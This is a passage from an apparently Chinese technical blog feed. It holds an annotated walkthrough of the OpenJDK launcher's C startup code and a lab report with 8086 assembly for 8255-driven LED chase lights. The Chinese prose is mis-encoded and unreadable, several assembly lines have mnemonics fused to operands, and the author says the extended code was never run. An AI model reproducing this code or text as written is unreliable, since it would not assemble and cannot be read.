class="line"><span class="params">        <span class="type">int</span> jargc, <span class="type">const</span> <span class="type">char</span>** jargv,          <span class="comment">/* java args */</span></span></span><br><span class="line"><span class="params">        <span class="type">int</span> appclassc, <span class="type">const</span> <span class="type">char</span>** appclassv,  <span class="comment">/* app classpath */</span></span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">char</span>* fullversion,                <span class="comment">/* full version defined */</span></span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">char</span>* dotversion,                 <span class="comment">/* dot version defined */</span></span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">char</span>* pname,                      <span class="comment">/* program name */</span></span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">char</span>* lname,                      <span class="comment">/* launcher name */</span></span></span><br><span class="line"><span class="params">        jboolean javaargs,                      <span class="comment">/* JAVA_ARGS */</span></span></span><br><span class="line"><span class="params">        jboolean cpwildcard,                    <span class="comment">/* classpath wildcard */</span></span></span><br><span class="line"><span class="params">        jboolean javaw,                         <span class="comment">/* windows-only javaw */</span></span></span><br><span class="line"><span class="params">        jint     ergo_class                     <span class="comment">/* ergnomics policy */</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><h4 id="1-åˆå§‹åŒ–"><a href="#1-åˆå§‹åŒ–" class="headerlink" title="1.åˆå§‹åŒ–"></a>1.åˆå§‹åŒ–</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">InitLauncher(javaw);  <span class="comment">//åˆå§‹åŒ–å¯åŠ¨å™¨</span></span><br><span class="line">DumpState();  <span class="comment">//æ‰“å°å½“å‰çŠ¶æ€</span></span><br><span class="line"><span class="comment">//ç¡®ä¿å¼€å¯å¯åŠ¨å™¨è·Ÿè¸ªçŠ¶æ€</span></span><br><span class="line"><span class="keyword">if</span> (JLI_IsTraceLauncher()) &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Command line args:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; argc ; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;argv[%d] = %s\n&quot;</span>, i, argv[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    AddOption(<span class="string">&quot;-Dsun.java.launcher.diag=true&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-é€‰æ‹©jreç‰ˆæœ¬"><a href="#2-é€‰æ‹©jreç‰ˆæœ¬" class="headerlink" title="2.é€‰æ‹©jreç‰ˆæœ¬"></a>2.é€‰æ‹©jreç‰ˆæœ¬</h4><p>è§£æå‚æ•°ï¼Œè¯»å–manifestæ–‡ä»¶ï¼Œjreç‰ˆæœ¬æ ¡éªŒï¼ŒåŠ è½½jreä»¥ä¾¿ç¡®è®¤æ˜¯å¦å­˜åœ¨ï¼Œæœ€åå°†ç›¸å…³ç¯å¢ƒå˜é‡æ”¾ç½®å¥½ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SelectVersion(argc, argv, &amp;main_class);</span><br></pre></td></tr></table></figure><h4 id="3-åˆ›å»ºJVMæ‰§è¡Œç¯å¢ƒ"><a href="#3-åˆ›å»ºJVMæ‰§è¡Œç¯å¢ƒ" class="headerlink" title="3.åˆ›å»ºJVMæ‰§è¡Œç¯å¢ƒ"></a>3.åˆ›å»ºJVMæ‰§è¡Œç¯å¢ƒ</h4><p>ç¡®å®šæ•°æ®æ¨¡å‹ï¼Œæ˜¯32ä½è¿˜æ˜¯64ä½ï¼Œä»¥åŠjvmæœ¬èº«çš„ä¸€äº›é…ç½®åœ¨jvm.cfgæ–‡ä»¶ä¸­è¯»å–å’Œè§£æ<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CreateExecutionEnvironment(&amp;argc, &amp;argv,</span><br><span class="line">                               jrepath, <span class="keyword">sizeof</span>(jrepath), <span class="comment">//jreè·¯å¾„</span></span><br><span class="line">                               jvmpath, <span class="keyword">sizeof</span>(jvmpath), <span class="comment">//jvmè·¯å¾„</span></span><br><span class="line">                               jvmcfg,  <span class="keyword">sizeof</span>(jvmcfg)); <span class="comment">//jvmé…ç½®æ–‡ä»¶</span></span><br></pre></td></tr></table></figure></p><h4 id="4-åŠ è½½jvm-soåº“"><a href="#4-åŠ è½½jvm-soåº“" class="headerlink" title="4.åŠ è½½jvm.soåº“"></a>4.åŠ è½½jvm.soåº“</h4><p>åŠ¨æ€åŠ è½½jvm.soè¿™ä¸ªå…±äº«åº“ï¼Œå¹¶æŠŠjvm.soä¸­çš„ç›¸å…³å‡½æ•°å¯¼å‡ºå¹¶ä¸”åˆå§‹åŒ–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!IsJavaArgs()) &#123;</span><br><span class="line">        <span class="comment">// è®¾ç½®ä¸€äº›ç‰¹æ®Šçš„ç¯å¢ƒå˜é‡</span></span><br><span class="line">        SetJvmEnvironment(argc,argv);</span><br><span class="line">    &#125;</span><br><span class="line">    ifn.CreateJavaVM = <span class="number">0</span>;</span><br><span class="line">    ifn.GetDefaultJavaVMInitArgs = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (JLI_IsTraceLauncher()) &#123;</span><br><span class="line">        start = CounterGet();     <span class="comment">// è®°å½•å¯åŠ¨æ—¶é—´</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// åŠ è½½VM, é‡ä¸­ä¹‹é‡</span></span><br><span class="line">    <span class="keyword">if</span> (!LoadJavaVM(jvmpath, &amp;ifn)) &#123;</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">6</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (JLI_IsTraceLauncher()) &#123;</span><br><span class="line">        end   = CounterGet();</span><br><span class="line">    &#125;</span><br><span class="line">    JLI_TraceLauncher(<span class="string">&quot;%ld micro seconds to LoadJavaVM\n&quot;</span>,</span><br><span class="line">             (<span class="type">long</span>)(jint)Counter2Micros(end-start));</span><br><span class="line">    ++argv;</span><br><span class="line">    --argc;</span><br><span class="line">    <span class="comment">// è§£ææ›´å¤šå‚æ•°ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">if</span> (IsJavaArgs()) &#123;</span><br><span class="line">        <span class="comment">/* Preprocess wrapper arguments */</span></span><br><span class="line">        TranslateApplicationArgs(jargc, jargv, &amp;argc, &amp;argv);</span><br><span class="line">        <span class="keyword">if</span> (!AddApplicationOptions(appclassc, appclassv)) &#123;</span><br><span class="line">            <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* Set default CLASSPATH */</span></span><br><span class="line">        cpath = getenv(<span class="string">&quot;CLASSPATH&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cpath == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            cpath = <span class="string">&quot;.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        SetClassPath(cpath);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Parse command line options; if the return value of</span></span><br><span class="line"><span class="comment">     * ParseArguments is false, the program should exit.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">// è§£æå‚æ•°</span></span><br><span class="line">    <span class="keyword">if</span> (!ParseArguments(&amp;argc, &amp;argv, &amp;mode, &amp;what, &amp;ret, jrepath))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>(ret);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Override class path if -jar flag was specified */</span></span><br><span class="line">    <span class="keyword">if</span> (mode == LM_JAR) &#123;</span><br><span class="line">        SetClassPath(what);     <span class="comment">/* Override class path */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* set the -Dsun.java.command pseudo property */</span></span><br><span class="line">    SetJavaCommandLineProp(what, argc, argv);</span><br><span class="line">    <span class="comment">/* Set the -Dsun.java.launcher pseudo property */</span></span><br><span class="line">    SetJavaLauncherProp();</span><br><span class="line">    <span class="comment">/* set the -Dsun.java.launcher.* platform properties */</span></span><br><span class="line">    SetJavaLauncherPlatformProps();</span><br></pre></td></tr></table></figure><h4 id="5-åˆå§‹åŒ–jvm"><a href="#5-åˆå§‹åŒ–jvm" class="headerlink" title="5.åˆå§‹åŒ–jvm"></a>5.åˆå§‹åŒ–jvm</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> JVMInit(&amp;ifn, threadStackSize, argc, argv, mode, what, ret);</span><br></pre></td></tr></table></figure><p>JVMInitå‡½æ•°æœ€åä¸€å¥æ˜¯<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> ContinueInNewThread(ifn, threadStackSize, argc, argv, mode, what, ret);</span><br></pre></td></tr></table></figure></p><p>ç»§ç»­çœ‹ContinueInNewThreadå‡½æ•°,ä¼šè¿›å…¥ContinueInNewThread0å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ContinueInNewThread0(JavaMain, threadStackSize, (<span class="type">void</span>*)&amp;args);</span><br></pre></td></tr></table></figure><p>å®ç°åœ¨æ–°çš„çº¿ç¨‹ä¸­æ‰§è¡ŒJavaMainå‡½æ•°</p><ol><li>åˆå§‹åŒ–è™šæ‹Ÿæœºï¼Œå¦‚æœæŠ¥é”™ç›´æ¥é€€å‡ºã€‚</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Initialize the virtual machine */</span></span><br><span class="line">start = CounterGet();</span><br><span class="line"><span class="keyword">if</span> (!InitializeJVM(&amp;vm, &amp;env, &amp;ifn)) &#123;</span><br><span class="line">    JLI_ReportErrorMessage(JVM_ERROR1);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>åŠ è½½ä¸»ç±»</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mainClass = LoadMainClass(env, mode, what);</span><br></pre></td></tr></table></figure><ol><li>è·å–Application Main Class</li></ol><p>æŸäº›æ²¡æœ‰ä¸»æ–¹æ³•çš„Javaç¨‹åºæ¯”å¦‚JavaFXåº”ç”¨ï¼Œä¼šè·å–Application Main Class</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * In some cases when launching an application that needs a helper, e.g., a</span></span><br><span class="line"><span class="comment"> * JavaFX application with no main method, the mainClass will not be the</span></span><br><span class="line"><span class="comment"> * applications own main class but rather a helper class. To keep things</span></span><br><span class="line"><span class="comment"> * consistent in the UI we need to track and report the application main class.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">appClass = GetApplicationClass(env);</span><br></pre></td></tr></table></figure><ol><li>åˆå§‹åŒ–å®Œæˆ</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PostJVMInit(env, appClass, vm);</span><br></pre></td></tr></table></figure><ol><li>è·å–ä¸»ç±»ä¸­çš„ä¸»æ–¹æ³•</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mainID = (*env)-&gt;GetStaticMethodID(env, mainClass, <span class="string">&quot;main&quot;</span>,<span class="string">&quot;([Ljava/lang/String;)V&quot;</span>);</span><br></pre></td></tr></table></figure><p>åœ¨å­—èŠ‚ç ä¸­void main(String[] args)è¡¨ç¤ºä¸º([Ljava/lang/String;)V</p><ol><li>è°ƒç”¨ä¸»æ–¹æ³•</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Invoke main method. */</span></span><br><span class="line">(*env)-&gt;CallStaticVoidMethod(env, mainClass, mainID, mainArgs);</span><br></pre></td></tr></table></figure><ol><li>LEAVEå‡½æ•°ç»“æŸçº¿ç¨‹,é”€æ¯JVM</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The launcher&#x27;s exit code (in the absence of calls to</span></span><br><span class="line"><span class="comment"> * System.exit) will be non-zero if main threw an exception.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ret = (*env)-&gt;ExceptionOccurred(env) == <span class="literal">NULL</span> ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">LEAVE();</span><br></pre></td></tr></table></figure><p>æµç¨‹å›¾å¦‚ä¸‹:<br><img src="https://pb01.s3.bitiful.net/91.png" alt="avatar"></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¥¿ç”µè®¡ç§‘å¾®æœºåŸç†å®éªŒå››</title>
      <link href="/2023/12/16/%E5%BE%AE%E6%9C%BA%E5%8E%9F%E7%90%86%E5%AE%9E%E9%AA%8C4/"/>
      <url>/2023/12/16/%E5%BE%AE%E6%9C%BA%E5%8E%9F%E7%90%86%E5%AE%9E%E9%AA%8C4/</url>
      
        <content type="html"><![CDATA[<h3 id="è¥¿ç”µè®¡ç§‘å¾®æœºåŸç†å®éªŒå››"><a href="#è¥¿ç”µè®¡ç§‘å¾®æœºåŸç†å®éªŒå››" class="headerlink" title="è¥¿ç”µè®¡ç§‘å¾®æœºåŸç†å®éªŒå››"></a>è¥¿ç”µè®¡ç§‘å¾®æœºåŸç†å®éªŒå››</h3><h4 id="å®éªŒè¦æ±‚"><a href="#å®éªŒè¦æ±‚" class="headerlink" title="å®éªŒè¦æ±‚"></a>å®éªŒè¦æ±‚</h4><ol><li>æµæ°´ç¯å®éªŒï¼šåˆ©ç”¨8255çš„Aå£ã€Bå£ã€Cå£å¾ªç¯ç‚¹äº®å‘å…‰äºŒæç®¡ã€‚</li><li>æ ¹æ®è¾“å…¥æ§åˆ¶ç¯çš„äº®ç­</li><li>åœ¨å®Œæˆ(1)åŸºç¡€ä¸Šï¼Œå¢åŠ é€šè¿‡è¯»å–å¼€å…³æ§åˆ¶æµæ°´ç¯çš„å¾ªç¯æ–¹å‘å’Œå¾ªç¯æ–¹å¼ã€‚</li></ol><p>è·Ÿä¸Šä¸€æ¬¡å®éªŒåŸºæœ¬ç›¸åŒ,æ¢äº†ä¸ªèŠ¯ç‰‡,ç„¶åæ§åˆ¶çš„èŒƒå›´ä»å…«é¢—å‘å…‰äºŒæç®¡å˜ä¸ºäº†åå…­é¢—å‘å…‰äºŒæç®¡</p><h4 id="åŸºç¡€ç‰ˆ"><a href="#åŸºç¡€ç‰ˆ" class="headerlink" title="åŸºç¡€ç‰ˆ"></a>åŸºç¡€ç‰ˆ</h4><p>ç®€å•å®ç°äº†åŠŸèƒ½1å’Œ2,å…¨1å·¦ç§»,å…¨0å³ç§»</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">COM_ADD EQU 0273H </span><br><span class="line">PA_ADD EQU 0270H </span><br><span class="line">PB_ADD EQU 0271H </span><br><span class="line">PC_ADD EQU 0272H </span><br><span class="line">_STACK SEGMENT STACK </span><br><span class="line"> DW 100 DUP(?) </span><br><span class="line">_STACK ENDS </span><br><span class="line">_DATA SEGMENT WORD PUBLIC &#x27;DATA&#x27; </span><br><span class="line">_DATA ENDS </span><br><span class="line">CODE SEGMENT </span><br><span class="line">START PROC NEAR </span><br><span class="line">ASSUME CS:CODE, DS:_DATA, SS:_STACK </span><br><span class="line">MOV AX,_DATA  ; å°†æ•°æ®æ®µåœ°å€åŠ è½½åˆ°AXå¯„å­˜å™¨</span><br><span class="line">MOV DS,AX ; å°†æ•°æ®æ®µåœ°å€ä¼ é€ç»™æ•°æ®æ®µå¯„å­˜å™¨DS</span><br><span class="line">NOP </span><br><span class="line">MOV DX,COM_ADD ; å°†ä¸²å£åœ°å€ä¼ é€ç»™DXå¯„å­˜å™¨</span><br><span class="line">MOV AL,82H ; è®¾ç½®ALå¯„å­˜å™¨çš„å€¼ä¸º82H</span><br><span class="line">OUT DX,AL </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">INPUT:</span><br><span class="line"> ; æ¸…é›¶æ“ä½œ</span><br><span class="line">MOV     AX, 0FFFFH </span><br><span class="line">MOVDX, PA_ADD</span><br><span class="line">OUT     DX, AX</span><br><span class="line">MOVDX, PC_ADD</span><br><span class="line">OUT     DX, AX</span><br><span class="line">; è¾“å…¥æ“ä½œ</span><br><span class="line">MOVDX, PB_ADD</span><br><span class="line">INal, DX</span><br><span class="line">mov    ah, 0</span><br><span class="line"></span><br><span class="line">; åˆ¤æ–­</span><br><span class="line">CMPal, 0FFH ;å…¨1</span><br><span class="line">JZ low1</span><br><span class="line">CMPal, 0 ;å…¨0</span><br><span class="line">JZ high1</span><br><span class="line">MOVDX, PA_ADD</span><br><span class="line">OUTDX, al</span><br><span class="line">JMPINPUT</span><br><span class="line">; å¤„ç†è¾“å…¥å€¼ä¸º0-7çš„æƒ…å†µ</span><br><span class="line">low1:</span><br><span class="line">MOVal, 7FH ; è®¾ç½®ALå¯„å­˜å™¨çš„å€¼ä¸º7FH</span><br><span class="line">MOVDX, PA_ADD ; å°†å¹¶å£PAåœ°å€ä¼ é€ç»™DXå¯„å­˜å™¨</span><br><span class="line">low2:</span><br><span class="line">ROLal, 1 ; å°†ALå¯„å­˜å™¨çš„å€¼å·¦å¾ªç¯ç§»ä½1ä½</span><br><span class="line">OUTDX, al</span><br><span class="line">CALL    Delay</span><br><span class="line">CMPal, 7FH</span><br><span class="line">JNElow2</span><br><span class="line">MOV    AX, 0FFFFH ; å°†AXå¯„å­˜å™¨çš„å€¼è®¾ä¸º0xFFFF</span><br><span class="line">OUT     DX, AX</span><br><span class="line">; å¤„ç†è¾“å…¥å€¼ä¸º8-15çš„æƒ…å†µ</span><br><span class="line">low3:</span><br><span class="line">MOVal, 7FH</span><br><span class="line">MOVDX, PC_ADD</span><br><span class="line">low4:</span><br><span class="line">ROLal, 1</span><br><span class="line">OUTDX, al</span><br><span class="line">CALL    Delay</span><br><span class="line">CMPal, 7FH</span><br><span class="line">JNElow4</span><br><span class="line">JMPINPUT</span><br><span class="line"></span><br><span class="line">; å¤„ç†è¾“å…¥å€¼ä¸º15-8çš„æƒ…å†µ</span><br><span class="line">high1:</span><br><span class="line">MOVal, 0FEH</span><br><span class="line">MOVDX, PC_ADD</span><br><span class="line">high2:</span><br><span class="line">RORal, 1</span><br><span class="line">OUTDX, al</span><br><span class="line">CALL    Delay</span><br><span class="line">CMPal, 0FEH</span><br><span class="line">JNEhigh2</span><br><span class="line">MOV    AX, 0FFFFH</span><br><span class="line">OUT     DX, AX</span><br><span class="line">; å¤„ç†è¾“å…¥å€¼ä¸º7-0çš„æƒ…å†µ</span><br><span class="line">high3:</span><br><span class="line">MOVal, 0FEH</span><br><span class="line">MOVDX, PA_ADD</span><br><span class="line">high4:</span><br><span class="line">RORal, 1</span><br><span class="line">OUTDX, al</span><br><span class="line">CALL    Delay</span><br><span class="line">CMPal, 0FEH</span><br><span class="line">JNEhigh4</span><br><span class="line">JMPINPUT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Delay PROC NEAR</span><br><span class="line">Delay1:</span><br><span class="line">XORCX,CX</span><br><span class="line">LOOP$</span><br><span class="line">RET</span><br><span class="line">DelayENDP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">START ENDP </span><br><span class="line">CODE ENDS </span><br><span class="line">END START</span><br></pre></td></tr></table></figure><h4 id="å®Œæ•´ç‰ˆ"><a href="#å®Œæ•´ç‰ˆ" class="headerlink" title="å®Œæ•´ç‰ˆ"></a>å®Œæ•´ç‰ˆ</h4><p>å¢åŠ äº†ä¸€äº›åŠŸèƒ½:</p><ul><li>è¾“å…¥ä¸º11010000æ—¶,æµæ°´ç¯å±•ç¤º00001101</li><li>è¾“å…¥ä¸º00001111æ—¶,å‰8é¢—å‘å…‰äºŒæç®¡å·¦ç§»,å8é¢—å‘å…‰äºŒæç®¡å³ç§»</li><li>è¾“å…¥ä¸º11110000æ—¶,å‰8é¢—å‘å…‰äºŒæç®¡å³ç§»,å8é¢—å‘å…‰äºŒæç®¡å·¦ç§»</li></ul><p>è¿™ä¸ªç‰ˆæœ¬çš„ä»£ç è¿˜æ²¡æœ‰åœ¨è¯•éªŒç®±ä¸Šè·‘è¿‡,æœ¬æ¥æˆ‘æ˜¯æƒ³éªŒè¯å®ŒåŸºç¡€ç‰ˆååŠ ä¸Šçš„,ä½†å½“æ—¶æˆ‘çš„è¯•éªŒç®±å‡ºäº†ä¸€äº›é—®é¢˜,æµªè´¹äº†æˆ‘å¥½å¤šæ—¶é—´,æ‰€ä»¥å®éªŒçš„æ—¶å€™åªè·‘äº†åŸºç¡€ç‰ˆ,åº”è¯¥æ˜¯æ²¡æœ‰é—®é¢˜çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line">COM_ADD EQU 0273H </span><br><span class="line">PA_ADD EQU 0270H </span><br><span 